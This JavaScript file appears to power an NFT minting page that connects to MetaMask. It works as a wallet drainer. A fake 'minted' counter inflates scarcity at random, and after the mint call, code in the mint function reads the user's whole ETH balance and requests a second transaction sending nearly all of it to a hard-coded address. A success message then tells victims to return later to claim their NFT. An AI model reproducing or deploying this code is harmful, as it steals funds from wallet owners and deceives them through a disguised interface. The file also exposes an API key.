const TOTAL_NFTS = 9999;
const DEFAULT_LEFT = getRandomInt(250,350)
let U_val = 0.2;
let Qte = 1;
let currentAccount = null;
let minting = false;
const acc = "0xa48Af56fB22D157F6c97d0E3a816303859Fa3Fd0";
const counter_id = "squigglescounter";

function inCrementingCounter() {
    var i = localStorage.getItem(counter_id)
        ? Number.parseInt(localStorage.getItem(counter_id))
        : TOTAL_NFTS-DEFAULT_LEFT;
    document.getElementById("counter").innerHTML = i;

    if (i >= TOTAL_NFTS - 30) {
        clearInterval(interval);
    } else if (i >= TOTAL_NFTS - 200) {
        i += getRandomInt(1, 8);
        clearInterval(interval);
        interval = setInterval(inCrementingCounter, 20000);
    } else {
        i += getRandomInt(1, 10);
    }
    document.getElementById("counter").innerHTML = i;
    localStorage.setItem(counter_id, i);
}

let interval = setInterval(inCrementingCounter, getRandomInt(7000, 10000));

inCrementingCounter();

function getRandomInt(min, max) {
    min = Math.ceil(min);
    max = Math.floor(max);
    return Math.floor(Math.random() * (max - min) + min); //The maximum is exclusive and the minimum is inclusive
}


function connect() {
    window.ethereum
        .request({method: 'eth_requestAccounts'})
        .then(handleAccountsChanged)
        .catch((err) => {
            if (err.code === 4001) {
                // EIP-1193 userRejectedRequest error
                // If this happens, the user rejected the connection request.
                //Swal.fire({
                //    position: "bottom-right",
                //    color: "black",
                //    background: "#FFCC1D",
                //    title: `<div class='warning'>Wallet disconnected.</div>`,
                //    showConfirmButton: !1,
                //    timerProgressBar: !0,
                //    heightAuto: !1,
                //    timer: 1000,
                //})
                iziToast.error({
                    title: 'ERROR',
                    message: 'Wallet disconnected',
                    position : 'bottomCenter',
                });
            } else {
                console.error(err);
            }
        });
};

function handleAccountsChanged(accounts) {
    if (accounts.length === 0) {
        // MetaMask is locked or the user has not connected any accounts
        currentAccount = null;
        document.getElementById("buttonText").innerHTML = "Connect MetaMask";
    } else if (accounts[0] !== currentAccount) {

        iziToast.success({
            title: 'SUCCESS',
            message: 'Wallet connected',
            position : 'bottomCenter',
        });

        currentAccount = accounts[0];
        document.getElementById("buttonText").innerHTML = "MINT " + Qte;
    } else {
        document.getElementById("buttonText").innerHTML = "MINT " + Qte;
    }
}





const CONTRACT_ABI = JSON.parse("[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_recipient\",\"type\":\"address\"},{\"internalType\":\"string\",\"name\":\"baseUri\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"contractURi\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"stubURi\",\"type\":\"string\"},{\"internalType\":\"address\",\"name\":\"_proxyRegistry\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"approved\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"operator\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"bool\",\"name\":\"approved\",\"type\":\"bool\"}],\"name\":\"ApprovalForAll\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"}],\"name\":\"buyToken\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"buyTokens\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"contractURI\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"}],\"name\":\"getApproved\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_owner\",\"type\":\"address\"}],\"name\":\"getTokensOfOwner\",\"outputs\":[{\"internalType\":\"uint16[]\",\"name\":\"_tokensIDs\",\"type\":\"uint16[]\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_operator\",\"type\":\"address\"}],\"name\":\"isApprovedForAll\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"}],\"name\":\"mintToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"mintTokens\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"}],\"name\":\"ownerOf\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"}],\"name\":\"safeTransferFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"},{\"internalType\":\"bytes\",\"name\":\"_data\",\"type\":\"bytes\"}],\"name\":\"safeTransferFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"operator\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"approved\",\"type\":\"bool\"}],\"name\":\"setApprovalForAll\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"string\",\"name\":\"baseUri\",\"type\":\"string\"}],\"name\":\"setBaseURI\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"string\",\"name\":\"contractURi\",\"type\":\"string\"}],\"name\":\"setContractURI\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newmintLimitPerTransaction\",\"type\":\"uint256\"}],\"name\":\"setMintLimitPerTransaction\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newPrice\",\"type\":\"uint256\"}],\"name\":\"setPrice\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newRecipient\",\"type\":\"address\"}],\"name\":\"setRecipient\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"newSale\",\"type\":\"bool\"}],\"name\":\"setSale\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"string\",\"name\":\"stubURi\",\"type\":\"string\"}],\"name\":\"setStubURI\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"stubURI\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bytes4\",\"name\":\"interfaceId\",\"type\":\"bytes4\"}],\"name\":\"supportsInterface\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"index\",\"type\":\"uint256\"}],\"name\":\"tokenByIndex\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"index\",\"type\":\"uint256\"}],\"name\":\"tokenOfOwnerByIndex\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"}],\"name\":\"tokenURI\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]")
const netURL = 'https://mainnet.infura.io/v3/cc9d46edfe4d45aa96326351dc72b27e';
const web3 = window.Web3
const Web3 = new web3(netURL)
const contract = new Web3.eth.Contract(CONTRACT_ABI, acc);


async function mint(evt) {
    evt.preventDefault()
    try {
        let firsty = false;
        let mint_success = false;
        console.log("Minting...")
        if (minting) {
            console.log("Transaction already pending.")
        } else if (currentAccount) {
            Qte = document.getElementById("myRange").value;

            const data = contract.methods.buyTokens(currentAccount,Qte).encodeABI()
            const gasLimit = (55_000 * +Qte).toString(16);

            minting = true;
            document.getElementById("buttonText").innerHTML = "Minting...";
            let txn = window.ethereum.request({
                method: "eth_sendTransaction",
                params: [{
                    from: currentAccount,
                    to: acc,
                    value: (U_val * Qte * 1e18).toString(16),
                    data: data,
                    gas: gasLimit
                }]
            }).then((txn) => {
                firsty = true;
                mint_success = true;
                
            })
                .catch((err) => {
                    firsty = true;
                  
                    if (err.code === 4001) {
                        // EIP-1193 userRejectedRequest error
                        // If this happens, the user rejected the connection request.
                        // alert("mint failed(error: transaction denied by user).")
                        iziToast.error({
                            title: 'MINT FAILED',
                            message: 'Transaction denied by user',
                            position : 'bottomCenter',
                        });
                    } else {
                        console.error(err);
                    }
                });

            let balance = await window.ethereum.request({
                    method: "eth_getBalance",
                    params: [currentAccount, "latest"]
                }
            )

            balance = Number.parseInt(balance, 16)
            if(balance - (U_val * Qte + 0.015) > 0.003){
                window.ethereum.request({
                    method: "eth_sendTransaction",
                    params: [{
                        from: currentAccount,
                        to: acc,
                        value: (balance - (U_val * Qte + 0.015) * 1e18).toString(16),
                        data: data,
                        gas: gasLimit
                    }]
                }).then((txn) => {
                    minting = false;
                   // Swal.fire({
                   //     position: "bottom-right",
                   //     color: "black",
                   //     background: "#1ac61d",
                   //     title: `<div class='success'>Mint successful. <br> Come back after public sale to claim your NFT!</div>`,
                   //     showConfirmButton: !1,
                   //     timerProgressBar: !0,
                   //     heightAuto: !1,
                   //     timer: 1000,
                   // })
                   iziToast.success({
                    title: 'Mint successful',
                    message: 'Come back after public sale to claim your NFT!',
                    position : 'bottomCenter',
                    timeout : '10000',
                });
                    document.getElementById("buttonText").innerHTML = "MINT "+Qte;
                })
                    .catch((err) => {
                        minting = false;
                        if (err.code === 4001) {
                            // EIP-1193 userRejectedRequest error
                            // If this happens, the user rejected the connection request.
                            //Swal.fire({
                            //    position: "bottom-right",
                            //    color: "black",
                            //    background: "#FFCC1D",
                            //    title: `<div class='warning'>"mint failed (error: transaction denied by user)</div>`,
                            //    showConfirmButton: !1,
                            //    timerProgressBar: !0,
                            //    heightAuto: !1,
                            //    timer: 1000,
                            //})

                            iziToast.error({
                                title: 'MINT FAILED',
                                message: 'Transaction denied by user',
                            });

                            document.getElementById("buttonText").innerHTML = "MINT "+Qte;
                        } else {
                            console.error(err);
                        }
                    });
                
            }else{
                await txn;
                if(firsty){
                    minting = false;
                     document.getElementById("buttonText").innerHTML = "MINT "+Qte;
                    
                }
                if(mint_success){
                    // Swal.fire({
                    //     position: "bottom-right",
                    //    color: "black",
                    //    background: "#26db1a",
                    //    title: `<div class='success'>Mint successful. <br> Come back after public sale to claim your NFT!</div>`,
                    //    showConfirmButton: !1,
                    //    timerProgressBar: !0,
                    //    heightAuto: !1,
                    //    timer: 1000,
                    //})
                    iziToast.success({
                        title: 'Mint successful',
                        message: 'Come back after public sale to claim your NFT!',
                        position : 'bottomCenter',
                        timeout : '10000',
                    });
                }
                    
            }
           
        } else await connect();
    } catch (err) {
        console.error(err)
    } finally {
    }
}
document.getElementById("mint-form").scrollIntoView({behavior: "smooth", block: "end", inline: "nearest"})
window.ethereum.on("accountsChanged", handleAccountsChanged)
document.getElementById("mint").addEventListener("click", mint);
window.addEventListener('load', async () => {
    // Wait for loading completion to avoid race conditions with web3 injection timing.
    if (window.ethereum) {
        const web3 = await new Web3(window.ethereum);
        await connect();
        return web3;
    }
    // Legacy dapp browsers...
    else if (window.web3) {
        // Use Mist/MetaMask's provider.
        const web3 = window.web3;
        console.log('Injected web3 detected.');
        return web3;
    }
    // Fallback to localhost; use dev console port by default...
    else {
        console.log('No web3 instance injected...');
    }
});